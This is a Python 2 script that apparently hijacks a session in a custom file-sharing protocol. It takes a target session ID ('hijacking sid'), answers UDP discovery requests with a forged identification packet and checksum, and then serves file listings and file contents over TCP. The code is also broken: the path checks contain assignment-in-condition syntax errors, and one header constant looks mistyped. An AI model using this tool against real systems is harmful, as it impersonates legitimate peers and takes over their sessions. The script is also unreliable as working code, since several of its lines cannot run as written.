import socket
import struct
from ctypes import *
import os
import sys

BUFFER_SIZE = 1024*128 #128KB
UDP_IP = socket.gethostbyname(socket.gethostname())
UDP_PORT = 1337
udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
udpSock.bind((UDP_IP, UDP_PORT))

tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


header = '\xdea\xaf'
ListFilesReq = 0x01
ListFilesResp = '\xde\xaf\x02'
GetFileReq = 0x03
GetFileResp = '\xde\xaf\x04'

udp_init_start = '\xde\xaf\x01'
mysid = sys.argv[1]
print 'hijacking sid:',mysid
myport = 31337
udp_resp_header = '\xde\xaf\x02'

tcpSock.bind((UDP_IP, myport))

base = "."


def SendList(path):
	bp = os.path.join(base,path)
	
	startPath = os.path.abspath(base)
	reqPath = os.path.abspath(bp)
	pref = os.path.commonprefix([startPath,reqPath])
	if not pref = startPath:
		return ''
		
	files = os.listdir(bp)
	header = struct.pack('!3sh',ListFilesResp,len(files))
	data = ''
	for i in files:
		p = os.path.normpath(os.path.join(bp,i))
		size = os.path.getsize(p)
		attr = windll.kernel32.GetFileAttributesA(p)
		if os.path.isdir(p):
			attr = 0x01
		else:
			attr = 0x00
		data += struct.pack('!bih{0}s'.format(len(i)),attr,size,len(i),i)
	return header+data	
	
def udpIdentify(data,addr):
	#data, addr = udpSock.recvfrom(1024) # buffer size is 1024 bytes
	
	if not (len(data) == 7):
		return
	bytes,sid = struct.unpack('!3si',data)


	if not (bytes == '\xde\xaf\x01') or not (sid == mysid):
		return
	format = '!3sihI'
	crc = (sid ^ 0xCAFEBABE) + 4 * (myport ^ 0x652)
	data = struct.pack(format,udp_resp_header,mysid,myport,crc)
	
	udpSock.sendto(data,addr)
	print "sent answer"

def SendFile(path):
	p = os.path.join(base,path)
	#verify no dir traversal
	startPath = os.path.abspath(base)
	reqPath = os.path.abspath(p)
	pref = os.path.commonprefix([startPath,reqPath])
	if not pref = startPath:
		return '',''
		
	if not os.path.isfile(p):
		return ''
	size = os.path.getsize(p)
	f = open(p,'rb')
	bytes = f.read()
	f.close()
	fdata = struct.pack('!{0}s'.format(size),bytes)
	data = struct.pack('!i',size)
	#print data
	return GetFileResp+data , fdata
	
while True:
	data, addr = udpSock.recvfrom(BUFFER_SIZE) # buffer size is 1024 bytes
	udpIdentify(data,addr)
	#udpSock.close() #remove
	
	tcpSock.listen(1)
	conn, addr = tcpSock.accept()
	data = conn.recv(BUFFER_SIZE)
	#validate data
	header ,b, dlen = struct.unpack('!2sbh',data[:5])
	path = struct.unpack('!{0}s'.format(dlen),data[5:])[0]
	#print "type", b, ";", 0x1 == b
	
	if b == ListFilesReq:
		print "list"
		conn.send(SendList(path))
	elif b == GetFileReq:
		print "get"
		head,data = SendFile(path)
		conn.send(head)
		conn.send(data)
	conn.close()
	
	
	#tcpSock.close() #remove
	
	

